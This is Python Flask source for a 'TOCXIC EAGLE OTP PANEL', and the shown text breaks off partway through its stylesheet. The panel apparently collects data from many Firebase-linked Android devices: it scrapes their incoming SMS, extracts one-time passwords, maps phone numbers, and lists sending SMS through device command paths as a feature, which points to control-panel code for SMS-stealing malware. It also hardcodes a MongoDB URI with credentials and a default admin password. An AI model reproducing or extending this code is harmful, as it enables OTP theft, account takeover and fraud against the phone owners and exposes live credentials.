#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
═══════════════════════════════════════════════════════════════════
  TOCXIC EAGLE OTP PANEL — v72 COMPLETE
═══════════════════════════════════════════════════════════════════
  Features:
    • User panel /user  (public, no login)
    • Admin panel /admin/dashboard (login protected)
    • Broadcast mail (admin → users via 📧 Mail tab)
    • Send SMS (via Firebase RTDB command paths → Android app)
    • Personal OTP page
    • Firebases management
    • Security / password change
    • Dark theme (matching index.html)
    • BG_REFRESH_INTERVAL = 600s
═══════════════════════════════════════════════════════════════════
"""

from flask import Flask, request, jsonify, session, redirect, url_for, Response, abort
from functools import wraps
from pymongo import MongoClient
from bson import ObjectId
import requests, os, re, json, threading, time, hashlib
from collections import Counter
from datetime import datetime, timezone, timedelta

# ═══════════════════════════════════════════════════════════════
# APP SETUP
# ═══════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "tocxic-eagle-secret-key-local-2026")
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=timedelta(days=7),
)

MONGO_URI = os.environ.get("MONGO_URI",
    "mongodb+srv://RahulRORO:Rahulboss@cluster0.xfwjmqk.mongodb.net/?appName=Cluster0")
IS_SERVERLESS = os.environ.get("IS_SERVERLESS", "false").lower() in ("1","true","yes")
ADMIN_URL_KEY = os.environ.get("ADMIN_URL_KEY", "tocxic-master-2026-v69")
BG_REFRESH_INTERVAL = 600
MESSAGE_CACHE_TTL = 5
MAX_SMS_PER_NUMBER = 10
FETCH_TIMEOUT = 8
FAST_FETCH_TIMEOUT = 8
MAX_PARALLEL = 20
MAX_DEVICES_PER_FB = 300
IST = timezone(timedelta(hours=5, minutes=30))
FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "tocxic_eagle_salt_2026_v70")
DEFAULT_ADMIN_PWD = os.environ.get("DEFAULT_ADMIN_PWD", "admin123")

# ═══════════════════════════════════════════════════════════════
# MONGODB
# ═══════════════════════════════════════════════════════════════
MONGO_OK = False
mongo_client = db = fb_collection = settings_collection = broadcast_collection = sms_log_collection = None
_mongo_ready = False
_mongo_lock = threading.Lock()

def fb_hash(url):
    return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]

def init_mongo(force=False):
    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, broadcast_collection, sms_log_collection, _mongo_ready
    if _mongo_ready and not force:
        return MONGO_OK
    with _mongo_lock:
        if _mongo_ready and not force:
            return MONGO_OK
        try:
            mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=4000,
                connectTimeoutMS=4000, socketTimeoutMS=8000, maxPoolSize=20, retryWrites=True)
            db = mongo_client["otp_panel"]
            fb_collection = db["firebases"]
            settings_collection = db["settings"]
            broadcast_collection = db["broadcasts"]
            sms_log_collection = db["sms_logs"]
            try:
                broadcast_collection.create_index([("device_id", 1), ("created_at", -1)])
                broadcast_collection.create_index([("bc_id", 1)])
                fb_collection.create_index([("url", 1)], unique=True)
                sms_log_collection.create_index([("sent_at", -1)])
            except Exception:
                pass
            mongo_client.admin.command("ping")
            MONGO_OK = True
            print("[✓] MongoDB connected")
        except Exception as e:
            MONGO_OK = False
            print(f"[×] MongoDB error: {e}")
        finally:
            _mongo_ready = True
    return MONGO_OK

def get_pwd(role):
    if not MONGO_OK: return DEFAULT_ADMIN_PWD
    try:
        doc = settings_collection.find_one({"_id": f"{role}_password"})
        if doc and doc.get("value"): return doc["value"]
    except Exception: pass
    return DEFAULT_ADMIN_PWD

def set_pwd(role, pwd):
    if not MONGO_OK: return False
    try:
        settings_collection.update_one({"_id": f"{role}_password"},
            {"$set": {"value": pwd, "updated_at": int(time.time())}}, upsert=True)
        return True
    except Exception: return False

# ═══════════════════════════════════════════════════════════════
# CACHE
# ═══════════════════════════════════════════════════════════════
cache = {
    "numbers_map": {}, "devices": {}, "device_messages": {}, "msg_cache_time": {},
    "stats": {"total": 0, "online": 0, "offline": 0, "otp_rate": 0},
    "last_update": 0, "loading": False, "progress": {"done": 0, "total": 0},
    "lock": threading.Lock(), "inbox_locks": {},
    "fb_stats": {}, "fb_stats_time": 0,
}

# ═══════════════════════════════════════════════════════════════
# FIELD SETS
# ═══════════════════════════════════════════════════════════════
NUM_FIELDS = {"number","phone","phonenumber","mobno","mobile","msisdn","simnumber",
    "sim1number","sim2number","line1number","line2number","subscriberid",
    "devicephonenumber","to","from","receiver","sender","address","origin","src",
    "tonumber","to_number","fromaddress","tophoneno","mob_no","senderid",
    "destination","dest","recipient","phonenum","sim_phone_no",
    "sim1_phone_no","sim2_phone_no","operatornumber","phno"}
MSG_FIELDS = {"message","body","text","msg","content","messagetext","messagebody",
    "sms","smsbody","smscontent","smsbodytext","lastmessage","fullmessage",
    "sms_message","msgbody"}
TIME_FIELDS = {"timestamp","time","date","receivedtime","datetime","createdat",
    "senttime","smstime","devicetime","date_time","received_time",
    "sent_time","sms_time","device_time","smsdate","receivedat","sentat",
    "lastmessagetime","recvtime","logtime","event_time"}
SENT_KEYS = {"command","commands","sendsms","action","webhookevent",
    "send_sms","sentsms","outgoing","sent_messages","outbox"}
INCOMING_TYPES = {"incoming","received","inbox","recv","in"}

# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════
def digits_only(s): return re.sub(r"\D", "", str(s) if s is not None else "")

def normalize_number(n):
    d = digits_only(n)
    return d[-10:] if len(d) >= 10 else d

def is_clean_phone_number(s):
    if not s or not isinstance(s, str): return False
    s = s.strip()
    if not s or len(s) > 25: return False
    if any(c in s for c in ("|",":","/","\\","T","Z")): return False
    if any(w in s.lower() for w in ("otp","password","http","@","#","msg","am","pm")): return False
    if not re.fullmatch(r"[\+\d\s\-]+", s): return False
    return 10 <= len(digits_only(s)) <= 15

def extract_real_numbers_from_message(message):
    if not message: return []
    text = re.sub(r'\d{3,4}[Xx*]{2,6}\d{2,4}', ' ', str(message))
    found, seen = [], set()
    for m in re.finditer(r'\+91[\s\-]?([6-9]\d{9})', text):
        n = m.group(1)
        if n not in seen: seen.add(n); found.append(n)
    for m in re.finditer(r'(?<!\d)([6-9]\d{9})(?!\d)', text):
        n = m.group(1)
        if n not in seen: seen.add(n); found.append(n)
    return found

def parse_date_string(s):
    if not s or not isinstance(s, str): return 0
    try:
        m = re.match(r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)",
                     s.strip(), re.IGNORECASE)
        if not m: return 0
        day, month, year, hour, minute, ap = m.groups()
        hour = int(hour)
        if ap.lower() == "pm" and hour != 12: hour += 12
        if ap.lower() == "am" and hour == 12: hour = 0
        dt = datetime(int(year), int(month), int(day), hour, int(minute), tzinfo=IST)
        return int(dt.timestamp())
    except Exception: return 0

def collect_all_numbers(obj, found=None, depth=0):
    if found is None: found = []
    if depth > 8: return found
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str) and k.lower() in NUM_FIELDS and is_clean_phone_number(v):
                found.append(v.strip())
            if isinstance(v, (dict, list)):
                collect_all_numbers(v, found, depth + 1)
    elif isinstance(obj, list):
        for item in obj: collect_all_numbers(item, found, depth + 1)
    return found

def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
    if found is None: found = []
    if depth > 10: return found
    if any(k in parent_key.lower() for k in SENT_KEYS): return found
    if isinstance(obj, dict):
        kl = {k.lower() for k in obj.keys()}
        if kl & MSG_FIELDS:
            def get_any(fs):
                for k in obj.keys():
                    if k.lower() in fs: return obj[k]
                return None
            body = get_any(MSG_FIELDS)
            to_val = from_val = num = None
            for k in obj.keys():
                kk = k.lower()
                if kk in ("to","recipient","tonumber","to_number","receiver","destination","dest"):
                    to_val = obj[k]
                elif kk in ("from","sender","fromnumber","from_number","address",
                            "originatingaddress","senderaddress","originator","source","src"):
                    from_val = obj[k]
                elif kk in NUM_FIELDS and num is None:
                    num = obj[k]
            date_str = None
            for k in obj.keys():
                if k.lower() in ("datetime","date_time","date","datetimestr"):
                    v = obj[k]
                    if isinstance(v, str) and ("|" in v or "am" in v.lower() or "pm" in v.lower()):
                        date_str = v; break
            ts = parse_date_string(date_str) if date_str else 0
            if not ts:
                ts_raw = get_any(TIME_FIELDS)
                if ts_raw:
                    try:
                        ts = int(ts_raw)
                        if ts > 1e12: ts = ts // 1000
                    except Exception: ts = 0
            msg_id = obj.get("id")
            if not ts and msg_id:
                try:
                    mid = int(msg_id)
                    if mid > 1e12: ts = mid // 1000
                    elif mid > 1e9: ts = mid
                except Exception: pass
            if not ts: ts = parent_ts
            msg_type = str(obj.get("type", "")).lower().strip()
            is_sended = obj.get("isSended") if "isSended" in obj else obj.get("isSent")
            keep = True
            if msg_type in INCOMING_TYPES: keep = True
            elif msg_type in ("sent","outgoing","outbox","send","sentmessage","sentsms"): keep = False
            elif is_sended is True: keep = False
            elif is_sended is False: keep = True
            elif from_val and not to_val: keep = True
            elif to_val and not from_val: keep = False
            elif not to_val and not from_val: keep = True
            else: keep = False
            if keep and body:
                display_from = from_val if from_val else (num if num else "Unknown")
                found.append({
                    "from": str(display_from) if display_from else "Unknown",
                    "to": str(to_val) if to_val else "",
                    "message": str(body), "timestamp": ts,
                    "date_string": date_str, "id": msg_id, "type": "received",
                })
        for k, v in obj.items():
            if any(x in k.lower() for x in SENT_KEYS): continue
            child_ts = parent_ts
            try:
                tk = int(k)
                if tk > 1e12: child_ts = tk // 1000
                elif tk > 1e9: child_ts = tk
            except Exception: pass
            collect_all_messages(v, found, depth + 1, child_ts, k)
    elif isinstance(obj, list):
        for item in obj:
            collect_all_messages(item, found, depth + 1, parent_ts, parent_key)
    return found

def extract_otp(text):
    if not text: return ""
    m = re.search(r"(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})",
                  text, re.IGNORECASE)
    if m: return m.group(1)
    m = re.search(r"(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)", text, re.IGNORECASE)
    if m: return m.group(1)
    m = re.search(r"#(\d{4,8})", text)
    if m: return m.group(1)
    return ""

def numbers_match(a, b):
    na, nb = normalize_number(a), normalize_number(b)
    return na == nb and na != ""

def is_online(info):
    if not isinstance(info, dict): return False
    if info.get("status") is True or info.get("isOnline") is True: return True
    if info.get("online") is True or info.get("connected") is True: return True
    if info.get("status") in ("online","active",1): return True
    if info.get("lastSeen"):
        try:
            if time.time() - int(info["lastSeen"]) < 600: return True
        except Exception: pass
    return False

def find_real_number_from_messages(all_msgs):
    counter = Counter()
    senders = set()
    for m in all_msgs:
        for sn in extract_real_numbers_from_message(m.get("from", "")):
            senders.add(sn)
    for m in all_msgs:
        if m.get("type") != "received": continue
        for n in extract_real_numbers_from_message(m.get("message", "")):
            if n in senders: continue
            if n.startswith(("1800","1900","1991")): continue
            counter[n] += 1
    return counter.most_common(10)

def parse_device_full(dev_data, dev_id):
    online = is_online(dev_data)
    name = dev_id[:16]
    for f in ["deviceName","device_name","name","model","deviceModel","brand",
              "manufacturer","phoneName","phoneModel","deviceInfo","productName",
              "hardware","deviceBrand"]:
        v = dev_data.get(f)
        if v and isinstance(v, str) and v.strip():
            name = v.strip()[:25]; break
    sims = []
    seen = set()
    for n in collect_all_numbers(dev_data):
        k = normalize_number(n)
        if not k or k in seen: continue
        seen.add(k)
        sims.append({"slot": 0, "number": n, "online": online, "confidence": 0})
    msgs = collect_all_messages(dev_data)
    seen_m, unique = set(), []
    for m in msgs:
        h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
        if h in seen_m: continue
        seen_m.add(h); unique.append(m)
    unique.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    per = {n["number"]: [] for n in sims}
    unmatched = []
    for m in unique:
        matched = False
        for n in sims:
            if numbers_match(m.get("to", ""), n["number"]) or numbers_match(m.get("from", ""), n["number"]):
                per[n["number"]].append(m); matched = True; break
        if not matched: unmatched.append(m)
    if unmatched and sims:
        for n in sims: per[n["number"]].extend(unmatched)
    for num in per:
        per[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
        per[num] = per[num][:MAX_SMS_PER_NUMBER]
    return {
        "name": name, "online": online, "sims": sims,
        "battery": dev_data.get("battery", 0) if isinstance(dev_data, dict) else 0,
        "messages": unique[:MAX_SMS_PER_NUMBER], "per_number": per,
        "total_msgs": len(unique),
        "total_otp": sum(1 for m in unique if extract_otp(m.get("message", ""))),
    }

# ═══════════════════════════════════════════════════════════════
# HTTP SESSION
# ═══════════════════════════════════════════════════════════════
_tls = threading.local()

def _sess():
    if not hasattr(_tls, "s"):
        s = requests.Session()
        s.headers.setdefault("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36")
        _tls.s = s
    return _tls.s

def try_json(url, timeout=FETCH_TIMEOUT):
    try:
        r = _sess().get(url, timeout=timeout)
        if r.status_code != 200: return None
        t = r.text.strip()
        if not t or t == "null": return None
        return json.loads(t)
    except Exception: return None

# ═══════════════════════════════════════════════════════════════
# FIREBASE FETCH
# ═══════════════════════════════════════════════════════════════
def fetch_device_ids(fb_url):
    base = fb_url.rstrip("/")
    for path in ["/clients.json?shallow=true","/clients.json",
                 "/devices.json?shallow=true","/devices.json",
                 "/users.json?shallow=true","/users.json",
                 "/data.json?shallow=true","/data.json"]:
        d = try_json(base + path)
        if isinstance(d, dict) and d: return list(d.keys())
    return []

def fetch_device_data(fb_url, dev_id):
    base = fb_url.rstrip("/")
    for p in [f"/clients/{dev_id}.json", f"/devices/{dev_id}.json",
              f"/users/{dev_id}.json", f"/data/{dev_id}.json", f"/{dev_id}.json"]:
        d = try_json(base + p)
        if isinstance(d, dict): return d
    return None

SMS_PATHS = [
    "/messages/{id}.json","/clients/{id}/messages.json","/clients/{id}/sms.json",
    "/clients/{id}/smsInbox.json","/clients/{id}/inbox.json",
    "/clients/{id}/receivedSms.json","/clients/{id}/received.json",
    "/clients/{id}/incoming.json","/clients/{id}/smsList.json",
    "/clients/{id}/receivedMessages.json","/clients/{id}/messageList.json",
    "/clients/{id}/allSms.json","/clients/{id}/allMessages.json",
    "/clients/{id}/history.json","/clients/{id}/logs.json",
    "/devices/{id}/messages.json","/devices/{id}/sms.json",
    "/devices/{id}/inbox.json","/devices/{id}/receivedSms.json",
    "/users/{id}/messages.json","/users/{id}/sms.json",
    "/data/{id}/messages.json","/sms/{id}.json","/inbox/{id}.json",
    "/received/{id}.json","/incoming/{id}.json","/messages/{id}/sms.json",
]

def fetch_messages_primary(fb_url, dev_id):
    base = fb_url.rstrip("/")
    all_msgs, seen = [], set()
    for tpl in SMS_PATHS:
        data = try_json(base + tpl.format(id=dev_id), timeout=8)
        if not data: continue
        for m in collect_all_messages(data):
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen: continue
            seen.add(h); all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs

def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
    base = fb_url.rstrip("/")
    all_msgs, seen = [], set()
    data = try_json(f'{base}/messages/{dev_id}.json?orderBy="$key"&limitToLast=60',
                    timeout=FAST_FETCH_TIMEOUT)
    if not data:
        data = try_json(f'{base}/messages/{dev_id}.json', timeout=20)
    if data and isinstance(data, dict):
        for m in collect_all_messages(data):
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen: continue
            seen.add(h); all_msgs.append(m)
    for m in fetch_messages_primary(fb_url, dev_id):
        h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
        if h in seen: continue
        seen.add(h); all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs[:MAX_SMS_PER_NUMBER]

def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
    out = []
    ids = fetch_device_ids(fb_url)[:MAX_DEVICES_PER_FB]
    for did in ids:
        raw = fetch_device_data(fb_url, did)
        if not raw: continue
        dev = parse_device_full(raw, did)
        msgs = fetch_messages_primary(fb_url, did)
        if msgs:
            existing = set()
            for m in dev["messages"]:
                existing.add(f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}")
            for m in msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                if h not in existing:
                    dev["messages"].append(m); existing.add(h)
            dev["messages"].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            dev["messages"] = dev["messages"][:MAX_SMS_PER_NUMBER]
            dev["total_msgs"] = len(dev["messages"])
            dev["total_otp"] = sum(1 for m in dev["messages"] if extract_otp(m.get("message", "")))
        if not dev["sims"]:
            top = find_real_number_from_messages(dev["messages"])
            if top:
                dev["sims"] = [{"slot": 0, "number": top[0][0], "online": dev["online"], "confidence": top[0][1]}]
            else:
                dev["sims"] = [{"slot": 0, "number": "UNKNOWN-" + did[:6], "online": dev["online"], "confidence": 0}]
        per = {s["number"]: [] for s in dev["sims"]}
        unmatched = []
        for m in dev["messages"]:
            matched = False
            for n in dev["sims"]:
                if numbers_match(m.get("to", ""), n["number"]) or numbers_match(m.get("from", ""), n["number"]):
                    per[n["number"]].append(m); matched = True; break
            if not matched: unmatched.append(m)
        if unmatched and dev["sims"]:
            for n in dev["sims"]: per[n["number"]].extend(unmatched)
        for num in per:
            per[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            per[num] = per[num][:MAX_SMS_PER_NUMBER]
        dev["per_number"] = per
        with cache["lock"]:
            cache["device_messages"][f"{fb_url}|{did}"] = list(dev["messages"])
            cache["msg_cache_time"][f"{fb_url}|{did}"] = time.time()
        dev["id"] = did
        dev["firebase"] = fb_url
        dev["fb_name"] = fb_name
        dev["fb_id"] = fb_id
        out.append(dev)
    return out

def merge_numbers_into_cache(devices):
    with cache["lock"]:
        for dev in devices:
            online = dev.get("online", False)
            for sim in dev.get("sims", []):
                num = sim["number"]
                key = num if num.startswith("UNKNOWN-") else normalize_number(num)
                if not key or (not num.startswith("UNKNOWN-") and len(key) != 10): continue
                msgs = dev.get("per_number", {}).get(num, [])
                otp_c = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                if key not in cache["numbers_map"]:
                    cache["numbers_map"][key] = {
                        "number": num, "device_id": dev["id"],
                        "device_name": dev.get("name", ""),
                        "firebase": dev.get("firebase", ""),
                        "fb_id": dev.get("fb_id", ""),
                        "fb_name": dev.get("fb_name", ""),
                        "online": online, "msg_count": len(msgs), "otp_count": otp_c,
                        "battery": dev.get("battery", "?"),
                        "confidence": sim.get("confidence", 0),
                    }
                else:
                    ex = cache["numbers_map"][key]
                    if sim.get("confidence", 0) > ex.get("confidence", 0):
                        ex["number"] = num; ex["confidence"] = sim.get("confidence", 0)
                    if len(msgs) > ex["msg_count"]:
                        ex.update({"device_id": dev["id"], "device_name": dev.get("name", ""),
                                   "firebase": dev.get("firebase", ""), "fb_id": dev.get("fb_id", ""),
                                   "fb_name": dev.get("fb_name", ""),
                                   "msg_count": len(msgs), "otp_count": otp_c, "online": online})
                    elif online and not ex["online"]:
                        ex["online"] = True
            cache["devices"][f"{dev['firebase']}|{dev['id']}"] = dev
        nums = list(cache["numbers_map"].values())
        online = sum(1 for n in nums if n.get("online"))
        total_otp = sum(n.get("otp_count", 0) for n in nums)
        total_msg = sum(n.get("msg_count", 0) for n in nums)
        cache["stats"] = {
            "total": len(nums), "online": online, "offline": len(nums) - online,
            "otp_rate": int((total_otp / total_msg) * 100) if total_msg > 0 else 0,
        }

def fetch_fb_stats():
    init_mongo()
    if not MONGO_OK: return
    try:
        fbs = list(fb_collection.find({}))
    except Exception: return
    results = {}
    sem = threading.Semaphore(MAX_PARALLEL)
    def worker(fb):
        with sem:
            url = fb.get("url", "")
            fid = str(fb.get("_id", ""))
            if not url:
                results[fid] = {"online": 0, "offline": 0, "devices": 0}; return
            try:
                devs = fetch_devices_from_one_fb(url, fb.get("name", ""), fid)
                on = sum(1 for d in devs if d.get("online"))
                results[fid] = {"online": on, "offline": len(devs) - on, "devices": len(devs)}
            except Exception as e:
                print(f"fb_stats err {url}: {e}")
                results[fid] = {"online": 0, "offline": 0, "devices": 0}
    ts = []
    for fb in fbs:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start(); ts.append(t)
    for t in ts: t.join(timeout=60)
    with cache["lock"]:
        cache["fb_stats"] = results
        cache["fb_stats_time"] = time.time()

def fetch_all_devices():
    init_mongo()
    if not MONGO_OK: return
    try:
        fbs = list(fb_collection.find({}))
    except Exception: return
    with cache["lock"]:
        cache["progress"] = {"done": 0, "total": len(fbs)}
    sem = threading.Semaphore(MAX_PARALLEL)
    def worker(fb):
        with sem:
            url = fb.get("url", "")
            if not url:
                with cache["lock"]: cache["progress"]["done"] += 1
                return
            try:
                merge_numbers_into_cache(fetch_devices_from_one_fb(url, fb.get("name", ""), str(fb.get("_id", ""))))
            except Exception as e:
                print(f"worker err {url}: {e}")
            with cache["lock"]: cache["progress"]["done"] += 1
    ts = []
    for fb in fbs:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start(); ts.append(t)
    for t in ts: t.join(timeout=90)

def refresh_cache():
    with cache["lock"]:
        if cache["loading"]: return
        cache["loading"] = True
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
    try:
        fetch_all_devices()
        fetch_fb_stats()
        with cache["lock"]: cache["last_update"] = time.time()
        print(f"[✓] Cache refreshed — {cache['stats']['total']} numbers")
    except Exception as e:
        print(f"Refresh err: {e}")
    finally:
        with cache["lock"]: cache["loading"] = False

def bg_refresher():
    time.sleep(5)
    while True:
        try: refresh_cache()
        except Exception as e: print(f"BG: {e}")
        time.sleep(BG_REFRESH_INTERVAL)

# ═══════════════════════════════════════════════════════════════
# AUTH
# ═══════════════════════════════════════════════════════════════
def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("is_admin") and not (session.get("logged_in") and session.get("role") == "admin"):
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Admin required"}), 401
            return redirect(url_for("admin_login_page"))
        return f(*args, **kwargs)
    return wrapper

# ═══════════════════════════════════════════════════════════════
# DARK THEME CSS
# ═══════════════════════════════════════════════════════════════
ORBITRON = """
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&family=JetBrains+Mono:wght@400;600&family=Orbitron:wght@500;600;700;800;900&display=swap" rel="stylesheet">
"""

DARK_CSS = """
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
:root{
  --bg:#08090b;--bg2:#0d0f12;--bg3:#13151a;--bg4:#1a1d24;
  --border:#1e2128;--border2:#262a34;
  --text:#e8eaf0;--text2:#9aa0b0;--text3:#4a5068;
  --red:#E40000;--red2:#FF4D4D;--blue:#0F3CC9;--blue2:#3B82F6;
  --grad:linear-gradient(135deg,#E40000 0%,#0F3CC9 100%);
  --grad-r:linear-gradient(135deg,#E40000 0%,#FF4D4D 100%);
  --grad-b:linear-gradient(135deg,#0F3CC9 0%,#3B82F6 100%);
  --green:#22c55e;--purple:#a855f7;--amber:#f59e0b;
  --radius:10px;--radius2:14px;
}
html{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;-webkit-font-smoothing:antialiased}
body{min-height:100vh;overflow-x:hidden}
input,textarea,select,button{font-family:inherit;outline:none;border:none;font-size:16px}
button{cursor:pointer;background:none;color:inherit}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
.flex1{flex:1}.min0{min-width:0}
.flex{display:flex}.items-center{align-items:center}.justify-between{justify-content:space-between}

#login-page{min-height:100vh;display:flex;align-items:center;justify-content:center;
background:radial-gradient(ellipse 80% 60% at 70% 0%,#2a0a0a 0%,transparent 60%),
radial-gradient(ellipse 70% 50% at 30% 100%,#0a1240 0%,transparent 65%),var(--bg);padding:20px}
.login-box{width:100%;max-width:400px;text-align:center}
.logo-ring{width:72px;height:72px;border-radius:20px;background:var(--grad);
display:inline-flex;align-items:center;justify-content:center;margin-bottom:22px;
box-shadow:0 12px 36px rgba(228,0,0,.35)}
.logo-text{font-family:'Orbitron',sans-serif;font-weight:900;font-size:26px;letter-spacing:2px;
background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;font-style:italic}
.login-sub{font-size:11px;color:var(--text3);margin:8px 0 28px;letter-spacing:3px;
text-transform:uppercase;font-family:'Orbitron',sans-serif;font-weight:700}

.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 16px;
border-radius:var(--radius);font-size:13px;font-weight:700;transition:all .15s;text-decoration:none}
.btn-red{background:var(--grad-r);color:#fff;box-shadow:0 4px 14px rgba(228,0,0,.3)}
.btn-red:hover{filter:brightness(1.08)}
.btn-ghost{background:var(--bg3);border:1px solid var(--border2);color:var(--text2)}
.btn-ghost:hover{color:var(--text)}
.btn-sm{padding:6px 12px;font-size:12px}
.btn-icon{padding:8px;border-radius:var(--radius);background:var(--bg3);border:1px solid var(--border);color:var(--text3)}

#main-page{display:none;min-height:100vh;flex-direction:column}
.topbar{position:sticky;top:0;z-index:40;background:rgba(8,9,11,.92);backdrop-filter:blur(14px);
border-bottom:1px solid var(--border);padding:8px 16px;display:flex;align-items:center;gap:10px;
flex-wrap:wrap;padding-top:calc(8px + env(safe-area-inset-top));min-height:56px}
.topbar-logo{display:flex;align-items:center;gap:8px;font-family:'Orbitron',sans-serif;
font-weight:900;font-size:13px;letter-spacing:1px;font-style:italic}
.topbar-logo .eagle{font-size:20px}
.topbar-logo .name{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:8px}
.search-wrap{position:relative;flex:1;max-width:300px;min-width:140px}
.search-wrap svg{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text3)}
.search-inp{width:100%;padding:8px 12px 8px 32px;background:var(--bg3);border:1px solid var(--border);
border-radius:var(--radius);font-size:12px;color:var(--text)}
.search-inp:focus{border-color:var(--red)}
.clock{font-size:11px;color:var(--text3);font-family:'JetBrains Mono',monospace}

.nav-links{display:flex;gap:8px;padding:8px 16px;background:var(--bg2);border-bottom:1px solid var(--border);overflow-x:auto}
.nav-link{padding:8px 14px;border-radius:10px;font-size:12px;font-weight:700;text-decoration:none;
color:var(--text2);background:var(--bg3);border:1px solid var(--border);white-space:nowrap;transition:.15s}
.nav-link.active{background:var(--grad);color:#fff;border-color:transparent;box-shadow:0 4px 12px rgba(228,0,0,.25)}
.nav-link.green{background:rgba(34,197,94,.12);color:#4ade80;border-color:rgba(34,197,94,.3)}
.nav-link.green.active{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff;border-color:transparent}

.stats-bar{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 16px;display:flex;overflow-x:auto}
.stat-item{padding:10px 16px;border-right:1px solid var(--border);flex-shrink:0}
.stat-n{font-size:18px;font-weight:900;line-height:1;font-family:'Orbitron',sans-serif}
.stat-l{font-size:9px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.06em;margin-top:3px}

.filter-bar{background:var(--bg2);border-bottom:1px solid var(--border);padding:8px 16px;
display:flex;align-items:center;gap:6px;overflow-x:auto}
.filter-btn{padding:6px 12px;border-radius:20px;font-size:11px;font-weight:700;
background:var(--bg3);border:1px solid var(--border);color:var(--text3);flex-shrink:0;transition:all .15s;cursor:pointer}
.filter-btn.active{background:rgba(228,0,0,.15);border-color:rgba(228,0,0,.35);color:var(--red2)}
.filter-btn.active-green{background:rgba(34,197,94,.1);border-color:rgba(34,197,94,.25);color:var(--green)}
.filter-btn.active-purple{background:rgba(168,85,247,.1);border-color:rgba(168,85,247,.25);color:var(--purple)}
.sort-select{padding:6px 10px;background:var(--bg3);border:1px solid var(--border);
border-radius:var(--radius);font-size:11px;color:var(--text2);margin-left:auto}

.grid-main{padding:16px;padding-bottom:90px;display:grid;
grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
.device-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius2);
padding:14px;cursor:pointer;transition:all .15s;position:relative;overflow:hidden}
.device-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
background:var(--grad);opacity:0;transition:.2s}
.device-card:hover{border-color:var(--border2);background:var(--bg3);transform:translateY(-1px)}
.device-card:hover::before{opacity:1}
.dev-name{font-size:13px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dev-id{font-size:9px;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-top:2px;
overflow:hidden;text-overflow:ellipsis;white-space:nowrap}

.device-icon-tile{
  width:38px;height:38px;border-radius:11px;display:flex;align-items:center;justify-content:center;
  font-size:19px;flex-shrink:0;transition:.15s;
  background:linear-gradient(135deg,rgba(228,0,0,.18),rgba(15,60,201,.18));
  border:1px solid rgba(228,0,0,.3);box-shadow:0 3px 10px rgba(228,0,0,.15)
}
.device-icon-tile.offline{background:var(--bg3);border:1px solid var(--border);box-shadow:none;
  filter:grayscale(.5) opacity(.7)}

.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:20px;font-size:10px;font-weight:700}
.badge-green{background:rgba(34,197,94,.15);border:1px solid rgba(34,197,94,.25);color:var(--green)}
